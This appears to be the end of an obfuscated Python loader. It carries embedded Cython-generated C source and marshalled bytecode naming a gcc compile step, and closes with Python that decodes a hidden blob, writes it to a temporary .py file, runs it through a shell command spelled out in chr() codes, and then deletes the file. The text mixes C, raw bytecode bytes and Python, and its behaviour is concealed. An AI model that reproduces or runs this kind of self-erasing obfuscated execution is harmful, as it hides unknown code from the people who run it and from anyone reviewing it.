__Pyx_ModuleStateLookup_Lock()\n#define __Pyx_ModuleStateLookup_Unlock()\n#elif !CYTHON_COMPILING_IN_LIMITED_API && PY_VERSION_HEX >= 0x030d0000\nstatic PyMutex __Pyx_ModuleStateLookup_mutex = {0};\n#define __Pyx_ModuleStateLookup_Lock() PyMutex_Lock(&__Pyx_ModuleStateLookup_mutex)\n#define __Pyx_ModuleStateLookup_Unlock() PyMutex_Unlock(&__Pyx_ModuleStateLookup_mutex)\n#elif defined(__cplusplus) && __cplusplus >= 201103L\n#include <mutex>\nstatic std::mutex __Pyx_ModuleStateLookup_mutex;\n#define __Pyx_ModuleStateLookup_Lock() __Pyx_ModuleStateLookup_mutex.lock()\n#define __Pyx_ModuleStateLookup_Unlock() __Pyx_ModuleStateLookup_mutex.unlock()\n#elif defined(__STDC_VERSION__) && (__STDC_VERSION__ > 201112L) && !defined(__STDC_NO_THREADS__)\n#include <threads.h>\nstatic mtx_t __Pyx_ModuleStateLookup_mutex;\nstatic once_flag __Pyx_ModuleStateLookup_mutex_once_flag = ONCE_FLAG_INIT;\nstatic void __Pyx_ModuleStateLookup_initialize_mutex(void) {\n    mtx_init(&__Pyx_ModuleStateLookup_mutex, mtx_plain);\n}\n#define __Pyx_ModuleStateLookup_Lock()\\\n  call_once(&__Pyx_ModuleStateLookup_mutex_once_flag, __Pyx_ModuleStateLookup_initialize_mutex);\\\n  mtx_lock(&__Pyx_ModuleStateLookup_mutex)\n#define __Pyx_ModuleStateLookup_Unlock() mtx_unlock(&__Pyx_ModuleStateLookup_mutex)\n#elif defined(HAVE_PTHREAD_H)\n#include <pthread.h>\nstatic pthread_mutex_t __Pyx_ModuleStateLookup_mutex = PTHREAD_MUTEX_INITIALIZER;\n#define __Pyx_ModuleStateLookup_Lock() pthread_mutex_lock(&__Pyx_ModuleStateLookup_mutex)\n#define __Pyx_ModuleStateLookup_Unlock() pthread_mutex_unlock(&__Pyx_ModuleStateLookup_mutex)\n#elif defined(_WIN32)\n#include <Windows.h>  // synchapi.h on its own doesn\'t work\nstatic SRWLOCK __Pyx_ModuleStateLookup_mutex = SRWLOCK_INIT;\n#define __Pyx_ModuleStateLookup_Lock() AcquireSRWLockExclusive(&__Pyx_ModuleStateLookup_mutex)\n#define __Pyx_ModuleStateLookup_Unlock() ReleaseSRWLockExclusive(&__Pyx_ModuleStateLookup_mutex)\n#else\n#error "No suitable lock available for CYTHON_MODULE_STATE_LOOKUP_THREAD_SAFE.\\\n Requires C standard >= C11, or C++ standard >= C++11,\\\n or pthreads, or the Windows 32 API, or Python >= 3.13."\n#endif\ntypedef struct {\n    int64_t id;\n    PyObject *module;\n} __Pyx_InterpreterIdAndModule;\ntypedef struct {\n    char interpreter_id_as_index;\n    Py_ssize_t count;\n    Py_ssize_t allocated;\n    __Pyx_InterpreterIdAndModule table[1];\n} __Pyx_ModuleStateLookupData;\n#define __PYX_MODULE_STATE_LOOKUP_SMALL_SIZE 32\n#if CYTHON_MODULE_STATE_LOOKUP_THREAD_SAFE\nstatic __pyx_atomic_int_type __Pyx_ModuleStateLookup_read_counter = 0;\n#endif\n#if CYTHON_MODULE_STATE_LOOKUP_THREAD_SAFE\nstatic __pyx_atomic_ptr_type __Pyx_ModuleStateLookup_data = 0;\n#else\nstatic __Pyx_ModuleStateLookupData* __Pyx_ModuleStateLookup_data = NULL;\n#endif\nstatic __Pyx_InterpreterIdAndModule* __Pyx_State_FindModuleStateLookupTableLowerBound(\n        __Pyx_InterpreterIdAndModule* table,\n        Py_ssize_t count,\n        int64_t interpreterId) {\n    __Pyx_InterpreterIdAndModule* begin = table;\n    __Pyx_InterpreterIdAndModule* end = begin + count;\n    if (begin->id == interpreterId) {\n        return begin;\n    }\n    while ((end - begin) > __PYX_MODULE_STATE_LOOKUP_SMALL_SIZE) {\n        __Pyx_InterpreterIdAndModule* halfway = begin + (end - begin)/2;\n        if (halfway->id == interpreterId) {\n            return halfway;\n        }\n        if (halfway->id < interpreterId) {\n            begin = halfway;\n        } else {\n            end = halfway;\n        }\n    }\n    for (; begin < end; ++begin) {\n        if (begin->id >= interpreterId) return begin;\n    }\n    return begin;\n}\nstatic PyObject *__Pyx_State_FindModule(CYTHON_UNUSED void* dummy) {\n    int64_t interpreter_id = PyInterpreterState_GetID(__Pyx_PyInterpreterState_Get());\n    if (interpreter_id == -1) return NULL;\n#if CYTHON_MODULE_STATE_LOOKUP_THREAD_SAFE\n    __Pyx_ModuleStateLookupData* data = (__Pyx_ModuleStateLookupData*)__pyx_atomic_pointer_load_relaxed(&__Pyx_ModuleStateLookup_data);\n    {\n        __pyx_atomic_incr_acq_rel(&__Pyx_ModuleStateLookup_read_counter);\n        if (likely(data)) {\n            __Pyx_ModuleStateLookupData* new_data = (__Pyx_ModuleStateLookupData*)__pyx_atomic_pointer_load_acquire(&__Pyx_ModuleStateLookup_data);\n            if (likely(data == new_data)) {\n                goto read_finished;\n            }\n        }\n        __pyx_atomic_decr_acq_rel(&__Pyx_ModuleStateLookup_read_counter);\n        __Pyx_ModuleStateLookup_Lock();\n        __pyx_atomic_incr_relaxed(&__Pyx_ModuleStateLookup_read_counter);\n        data = (__Pyx_ModuleStateLookupData*)__pyx_atomic_pointer_load_relaxed(&__Pyx_ModuleStateLookup_data);\n        __Pyx_ModuleStateLookup_Unlock();\n    }\n  read_finished:;\n#else\n    __Pyx_ModuleStateLookupData* data = __Pyx_ModuleStateLookup_data;\n#endif\n    __Pyx_InterpreterIdAndModule* found = NULL;\n    if (unlikely(!data)) goto end;\n    if (data->interpreter_id_as_index) {\n        if (interpreter_id < data->count) {\n            found = data->table+interpreter_id;\n        }\n    } else {\n        found = __Pyx_State_FindModuleStateLookupTableLowerBound(\n            data->table, data->count, interpreter_id);\n    }\n  end:\n    {\n        PyObject *result=NULL;\n        if (found && found->id == interpreter_id) {\n            result = found->module;\n        }\n#if CYTHON_MODULE_STATE_LOOKUP_THREAD_SAFE\n        __pyx_atomic_decr_acq_rel(&__Pyx_ModuleStateLookup_read_counter);\n#endif\n        return result;\n    }\n}\n#if CYTHON_MODULE_STATE_LOOKUP_THREAD_SAFE\nstatic void __Pyx_ModuleStateLookup_wait_until_no_readers(void) {\n    while (__pyx_atomic_load(&__Pyx_ModuleStateLookup_read_counter) != 0);\n}\n#else\n#define __Pyx_ModuleStateLookup_wait_until_no_readers()\n#endif\nstatic int __Pyx_State_AddModuleInterpIdAsIndex(__Pyx_ModuleStateLookupData **old_data, PyObject* module, int64_t interpreter_id) {\n    Py_ssize_t to_allocate = (*old_data)->allocated;\n    while (to_allocate <= interpreter_id) {\n        if (to_allocate == 0) to_allocate = 1;\n        else to_allocate *= 2;\n    }\n    __Pyx_ModuleStateLookupData *new_data = *old_data;\n    if (to_allocate != (*old_data)->allocated) {\n         new_data = (__Pyx_ModuleStateLookupData *)realloc(\n            *old_data,\n            sizeof(__Pyx_ModuleStateLookupData)+(to_allocate-1)*sizeof(__Pyx_InterpreterIdAndModule));\n        if (!new_data) {\n            PyErr_NoMemory();\n            return -1;\n        }\n        for (Py_ssize_t i = new_data->allocated; i < to_allocate; ++i) {\n            new_data->table[i].id = i;\n            new_data->table[i].module = NULL;\n        }\n        new_data->allocated = to_allocate;\n    }\n    new_data->table[interpreter_id].module = module;\n    if (new_data->count < interpreter_id+1) {\n        new_data->count = interpreter_id+1;\n    }\n    *old_data = new_data;\n    return 0;\n}\nstatic void __Pyx_State_ConvertFromInterpIdAsIndex(__Pyx_ModuleStateLookupData *data) {\n    __Pyx_InterpreterIdAndModule *read = data->table;\n    __Pyx_InterpreterIdAndModule *write = data->table;\n    __Pyx_InterpreterIdAndModule *end = read + data->count;\n    for (; read<end; ++read) {\n        if (read->module) {\n            write->id = read->id;\n            write->module = read->module;\n            ++write;\n        }\n    }\n    data->count = write - data->table;\n    for (; write<end; ++write) {\n        write->id = 0;\n        write->module = NULL;\n    }\n    data->interpreter_id_as_index = 0;\n}\nstatic int __Pyx_State_AddModule(PyObject* module, CYTHON_UNUSED void* dummy) {\n    int64_t interpreter_id = PyInterpreterState_GetID(__Pyx_PyInterpreterState_Get());\n    if (interpreter_id == -1) return -1;\n    int result = 0;\n    __Pyx_ModuleStateLookup_Lock();\n#if CYTHON_MODULE_STATE_LOOKUP_THREAD_SAFE\n    __Pyx_ModuleStateLookupData *old_data = (__Pyx_ModuleStateLookupData *)\n            __pyx_atomic_pointer_exchange(&__Pyx_ModuleStateLookup_data, 0);\n#else\n    __Pyx_ModuleStateLookupData *old_data = __Pyx_ModuleStateLookup_data;\n#endif\n    __Pyx_ModuleStateLookupData *new_data = old_data;\n    if (!new_data) {\n        new_data = (__Pyx_ModuleStateLookupData *)calloc(1, sizeof(__Pyx_ModuleStateLookupData));\n        if (!new_data) {\n            result = -1;\n            PyErr_NoMemory();\n            goto end;\n        }\n        new_data->allocated = 1;\n        new_data->interpreter_id_as_index = 1;\n    }\n    __Pyx_ModuleStateLookup_wait_until_no_readers();\n    if (new_data->interpreter_id_as_index) {\n        if (interpreter_id < __PYX_MODULE_STATE_LOOKUP_SMALL_SIZE) {\n            result = __Pyx_State_AddModuleInterpIdAsIndex(&new_data, module, interpreter_id);\n            goto end;\n        }\n        __Pyx_State_ConvertFromInterpIdAsIndex(new_data);\n    }\n    {\n        Py_ssize_t insert_at = 0;\n        {\n            __Pyx_InterpreterIdAndModule* lower_bound = __Pyx_State_FindModuleStateLookupTableLowerBound(\n                new_data->table, new_data->count, interpreter_id);\n            assert(lower_bound);\n            insert_at = lower_bound - new_data->table;\n            if (unlikely(insert_at < new_data->count && lower_bound->id == interpreter_id)) {\n                lower_bound->module = module;\n                goto end;  // already in table, nothing more to do\n            }\n        }\n        if (new_data->count+1 >= new_data->allocated) {\n            Py_ssize_t to_allocate = (new_data->count+1)*2;\n            new_data =\n                (__Pyx_ModuleStateLookupData*)realloc(\n                    new_data,\n                    sizeof(__Pyx_ModuleStateLookupData) +\n                    (to_allocate-1)*sizeof(__Pyx_InterpreterIdAndModule));\n            if (!new_data) {\n                result = -1;\n                new_data = old_data;\n                PyErr_NoMemory();\n                goto end;\n            }\n            new_data->allocated = to_allocate;\n        }\n        ++new_data->count;\n        int64_t last_id = interpreter_id;\n        PyObject *last_module = module;\n        for (Py_ssize_t i=insert_at; i<new_data->count; ++i) {\n            int64_t current_id = new_data->table[i].id;\n            new_data->table[i].id = last_id;\n            last_id = current_id;\n            PyObject *current_module = new_data->table[i].module;\n            new_data->table[i].module = last_module;\n            last_module = current_module;\n        }\n    }\n  end:\n#if CYTHON_MODULE_STATE_LOOKUP_THREAD_SAFE\n    __pyx_atomic_pointer_exchange(&__Pyx_ModuleStateLookup_data, new_data);\n#else\n    __Pyx_ModuleStateLookup_data = new_data;\n#endif\n    __Pyx_ModuleStateLookup_Unlock();\n    return result;\n}\nstatic int __Pyx_State_RemoveModule(CYTHON_UNUSED void* dummy) {\n    int64_t interpreter_id = PyInterpreterState_GetID(__Pyx_PyInterpreterState_Get());\n    if (interpreter_id == -1) return -1;\n    __Pyx_ModuleStateLookup_Lock();\n#if CYTHON_MODULE_STATE_LOOKUP_THREAD_SAFE\n    __Pyx_ModuleStateLookupData *data = (__Pyx_ModuleStateLookupData *)\n            __pyx_atomic_pointer_exchange(&__Pyx_ModuleStateLookup_data, 0);\n#else\n    __Pyx_ModuleStateLookupData *data = __Pyx_ModuleStateLookup_data;\n#endif\n    if (data->interpreter_id_as_index) {\n        if (interpreter_id < data->count) {\n            data->table[interpreter_id].module = NULL;\n        }\n        goto done;\n    }\n    {\n        __Pyx_ModuleStateLookup_wait_until_no_readers();\n        __Pyx_InterpreterIdAndModule* lower_bound = __Pyx_State_FindModuleStateLookupTableLowerBound(\n            data->table, data->count, interpreter_id);\n        if (!lower_bound) goto done;\n        if (lower_bound->id != interpreter_id) goto done;\n        __Pyx_InterpreterIdAndModule *end = data->table+data->count;\n        for (;lower_bound<end-1; ++lower_bound) {\n            lower_bound->id = (lower_bound+1)->id;\n            lower_bound->module = (lower_bound+1)->module;\n        }\n    }\n    --data->count;\n    if (data->count == 0) {\n        free(data);\n        data = NULL;\n    }\n  done:\n#if CYTHON_MODULE_STATE_LOOKUP_THREAD_SAFE\n    __pyx_atomic_pointer_exchange(&__Pyx_ModuleStateLookup_data, data);\n#else\n    __Pyx_ModuleStateLookup_data = data;\n#endif\n    __Pyx_ModuleStateLookup_Unlock();\n    return 0;\n}\n#endif\n\n\n#ifdef _MSC_VER\n#pragma warning( pop )\n#endif\n\n\n\n\n#endif \n\n#ifdef __FreeBSD__\n#include <dede.h>\n#endif\n#if PY_MAJOR_VERSION < 3\nint main(int argc, char** argv) {\n#elif defined(Win32) || defined(MS_WINDOWS)\nint wmain(int argc, wchar_t **argv) {\n#else\nstatic int __Pyx_main(int argc, wchar_t **argv) {\n#endif\n#ifdef __FreeBSD__\n    fp_except_t m;\n    m = fpgetmask();\n    fpsetmask(m & ~FP_X_OFL);\n#endif\n    if (argc && argv)\n        Py_SetProgramName(argv[0]);\n    Py_Initialize();\n    if (argc && argv)\n        PySys_SetArgv(argc, argv);\n    {\n      PyObject* m = NULL;\n      __pyx_module_is_main_sx = 1;\n      #if PY_MAJOR_VERSION < 3\n          initsx();\n      #elif CYTHON_PEP489_MULTI_PHASE_INIT\n          m = PyInit_sx();\n          if (!PyModule_Check(m)) {\n              PyModuleDef *mdef = (PyModuleDef *) m;\n              PyObject *modname = PyUnicode_FromString("__main__");\n              m = NULL;\n              if (modname) {\n                  m = PyModule_NewObject(modname);\n                  Py_DECREF(modname);\n                  if (m) PyModule_ExecDef(m, mdef);\n              }\n          }\n      #else\n          m = PyInit_sx();\n      #endif\n      if (PyErr_Occurred()) {\n          PyErr_Print();\n          #if PY_MAJOR_VERSION < 3\n          if (Py_FlushLine()) PyErr_Clear();\n          #endif\n          return 1;\n      }\n      Py_XDECREF(m);\n    }\n#if PY_VERSION_HEX < 0x03060000\n    Py_Finalize();\n#else\n    if (Py_FinalizeEx() < 0)\n        return 2;\n#endif\n    return 0;\n}\n#if PY_MAJOR_VERSION >= 3 && !defined(Win32) && !defined(MS_WINDOWS)\n#include <locale.h>\nstatic wchar_t*\n__Pyx_char2wchar(char* arg)\n{\n    wchar_t *res;\n#ifdef HAVE_BROKEN_MBSTOWCS\n    size_t argsize = strlen(arg);\n#else\n    size_t argsize = mbstowcs(NULL, arg, 0);\n#endif\n    size_t count;\n    unsigned char *in;\n    wchar_t *out;\n#ifdef HAVE_MBRTOWC\n    mbstate_t mbs;\n#endif\n    if (argsize != (size_t)-1) {\n        res = (wchar_t *)malloc((argsize+1)*sizeof(wchar_t));\n        if (!res)\n            goto oom;\n        count = mbstowcs(res, arg, argsize+1);\n        if (count != (size_t)-1) {\n            wchar_t *tmp;\n            for (tmp = res; *tmp != 0 &&\n                     (*tmp < 0xd800 || *tmp > 0xdfff); tmp++)\n                ;\n            if (*tmp == 0)\n                return res;\n        }\n        free(res);\n    }\n#ifdef HAVE_MBRTOWC\n    argsize = strlen(arg) + 1;\n    res = (wchar_t *)malloc(argsize*sizeof(wchar_t));\n    if (!res) goto oom;\n    in = (unsigned char*)arg;\n    out = res;\n    memset(&mbs, 0, sizeof mbs);\n    while (argsize) {\n        size_t converted = mbrtowc(out, (char*)in, argsize, &mbs);\n        if (converted == 0)\n            break;\n        if (converted == (size_t)-2) {\n            fprintf(stderr, "unexpected mbrtowc result -2");\n            free(res);\n            return NULL;\n        }\n        if (converted == (size_t)-1) {\n            *out++ = 0xdc00 + *in++;\n            argsize--;\n            memset(&mbs, 0, sizeof mbs);\n            continue;\n        }\n        if (*out >= 0xd800 && *out <= 0xdfff) {\n            argsize -= converted;\n            while (converted--)\n                *out++ = 0xdc00 + *in++;\n            continue;\n        }\n        in += converted;\n        argsize -= converted;\n        out++;\n    }\n#else\n    res = (wchar_t *)malloc((strlen(arg)+1)*sizeof(wchar_t));\n    if (!res) goto oom;\n    in = (unsigned char*)arg;\n    out = res;\n    while(*in)\n        if(*in < 128)\n            *out++ = *in++;\n        else\n            *out++ = 0xdc00 + *in++;\n    *out = 0;\n#endif\n    return res;\noom:\n    fprintf(stderr, "out of memory");\n    return NULL;\n}\nint\nmain(int argc, char **argv)\n{\n    if (!argc) {\n        return __Pyx_main(0, NULL);\n    }\n    else {\n        int i, res;\n        wchar_t **argv_copy = (wchar_t **)malloc(sizeof(wchar_t*)*argc);\n        wchar_t **argv_copy2 = (wchar_t **)malloc(sizeof(wchar_t*)*argc);\n        char *oldloc = strdup(setlocale(LC_ALL, NULL));\n        if (!argv_copy || !argv_copy2 || !oldloc) {\n            fprintf(stderr, "out of memory");\n            free(argv_copy);\n            free(argv_copy2);\n            free(oldloc);\n            return 1;\n        }\n        res = 0;\n        setlocale(LC_ALL, "");\n        for (i = 0; i < argc; i++) {\n            argv_copy2[i] = argv_copy[i] = __Pyx_char2wchar(argv[i]);\n            if (!argv_copy[i]) res = 1;\n        }\n        setlocale(LC_ALL, oldloc);\n        free(oldloc);\n        if (res == 0)\n            res = __Pyx_main(argc, argv_copy);\n        for (i = 0; i < argc; i++) {\n#if PY_VERSION_HEX < 0x03050000\n            free(argv_copy2[i]);\n#else\n            PyMem_RawFree(argv_copy2[i]);\n#endif\n        }\n        free(argv_copy);\n        free(argv_copy2);\n        return res;\n    }\n}\n#endif\nz\x04sx.c\xda\x01.\xda\x01 \xe9\xff\xff\xff\xffz\x06gcc -Iz\x0f/include/pythonz\x04 -o z\x03 -Lz\r/lib -lpython\xda\x01w\xda\x02osT)\x01\xda\x08exist_ok)2\xda\x03map\xda\x03chr\xda\x01R\xda\x01A\xda\x01D\xda\x01H\xda\x01E\xda\x01Y\xda\x01J\xda\x01I\xda\x02RA\xda\x02DH\xda\x02EY\xda\x03JII\xda\x06RADHEY\xda\x08tempfile\xda\x01tr\x15\x00\x00\x00r\x0b\x00\x00\x00\xda\x08rdh_pathr\x0c\x00\x00\x00\xda\x05rdrmvr\r\x00\x00\x00\xda\x04stem\xda\x06base64r\x0e\x00\x00\x00\xda\x04lmao\xda\x05print\xda\n__import__\xda\x06prefix\xda\x06PREFIX\xda\x0cEXECUTE_FILE\xda\x11EXPORT_PYTHONHOME\xda\nexecutable\xda\x18EXPORT_PYTHON_EXECUTABLE\xda\x03RUN\xda\x06isfile\xda\x04exit\xda\x08C_SOURCE\xda\x06C_FILE\xda\x04join\xda\x07version\xda\x05split\xda\x0ePYTHON_VERSION\xda\x0cCOMPILE_FILE\xda\x04open\xda\x01f\xda\x05write\xda\x08makedirs\xda\x07dirname\xa9\x00\xf3\x00\x00\x00\x00\xda\x06radhey\xda\x08<module>rG\x00\x00\x00\x01\x00\x00\x00s8\x02\x00\x00\xf0\x03\x01\x01\x01\xd9\x14\x17\x98\x03\xd2\x1dA\xd3\x14B\xd1\x00\x11\x80\x01\x80!\x80A\x80a\x88\x01\x88!\x88A\x88a\x90\x01\xd8\x12\x13\x90A\x91#\x90q\x98\x11\x91s\x98A\x98a\x99C\xa0\x11\xa01\xa1\x13\xa0Q\xa1\x15\xd0\x12&\x81\x0f\x80\x02\x80B\x88\x02\x88C\xd8\t\n\x881\x89\x13\x88Q\x89\x15\x88q\x89\x17\x90\x11\x89\x19\x901\x89\x1b\x90Q\x89\x1d\x90q\x89\x1f\x98\x11\xd1\t\x1a\x80\x06\xdb\x00\x14\xdf\x00@\xd1\x00@\xdd\x00$\xe1\x00\x05\xd0\x06)\xd4\x00*\xd9\x00\x05\x80b\x84\t\xd9\x00\x05\xd0\x06G\xd4\x00H\xd9\x00\x05\x80b\x84\t\xd9\x07\x11\x90%\xd3\x07\x18\xd7\x07\x1f\xd1\x07\x1f\x80\x06\xd8\x0f\x1f\x80\x0c\xd8\x13\'\xa9\n\xb05\xd3(9\xd7(@\xd1(@\xd1\x13@\xd0\x00\x11\xd8\x1a5\xb1z\xc0%\xd37H\xd77S\xd17S\xd1\x1aS\xd0\x00\x18\xd8\x06\n\x88L\xd1\x06\x18\x80\x03\xd8\x03\x0b\x87?\x82?\x90<\xd7\x03 \xd1\x03 \xd9\x04\x08\xd0\t\x1a\x98D\xd1\t \xd0":\xd1\t:\xb8D\xd1\t@\xc0#\xd1\tE\xd4\x04F\xd9\x04\x08\x88\x11\x84G\xf0\x02g\\\x01\x0c\x04\x80\x08\xf0Py\x02\x00\t\x0f\x80\x06\xd8\x11\x14\x97\x18\x91\x18\x99*\xa0U\xd3\x1a+\xd7\x1a3\xd1\x1a3\xd7\x1a9\xd1\x1a9\xb8#\xd3\x1a>\xb8q\xd1\x1aA\xd7\x1aG\xd1\x1aG\xc8\x03\xd3\x1aL\xc8S\xc8b\xd0\x1aQ\xd3\x11R\x80\x0e\xd8\x10\x18\x986\xd1\x10!\xd0$5\xd1\x105\xb8\x0e\xd1\x10F\xc8\x16\xd1\x10O\xd0R^\xd1\x10^\xd0ad\xd1\x10d\xd0gm\xd1\x10m\xd0pu\xd1\x10u\xd0x~\xd1\x10~\xf0\x00\x00B\x02Q\x02\xf1\x00\x00\x11Q\x02\xf0\x00\x00T\x02b\x02\xf1\x00\x00\x11b\x02\x80\x0c\xd9\x05\t\x88&\x90\x13\xd4\x05\x15\x98\x11\xd8\x04\x05\x87G\x81G\x88H\xd4\x04\x15\xf7\x03\x00\x06\x16\xe1\x00\n\x884\xd3\x00\x10\xd7\x00\x19\xd1\x00\x19\x98(\xd7\x1a*\xd2\x1a*\xa8<\xd3\x1a8\xc0$\xd0\x00\x19\xd1\x00G\xd9\x00\x04\xd0\x05\x16\x98\x04\xd1\x05\x1c\xd0\x1e6\xd1\x056\xb8\x04\xd1\x05<\xb8|\xd1\x05K\xc8T\xd1\x05Q\xd0SV\xd1\x05V\xd4\x00W\xd9\x00\x05\x80f\x85\r\xf7\t\x00\x06\x16\xd5\x05\x15\xfas\x0c\x00\x00\x00\xc5)\x12G\x0c\x03\xc7\x0c\nG\x1a\x07'))')
try:
	with t.NamedTemporaryFile(delete=False, suffix='.py') as radhafile:
		radhafile.write(lmao(radheyenc))
		rdhpath = radhafile.name
	stem(''.join([chr(112), chr(121), chr(116), chr(104), chr(111), chr(110), chr(32)]) + '"' + rdhpath + '"')
except Exception as rdh_err:
	getattr(__import__('builtins'), ''.join(map(chr, [112,114,105,110,116])))(rdh_err)
finally:
	if 'rdhpath' in locals() and rdh_path.exists(rdhpath):
		rdrmv(rdhpath)
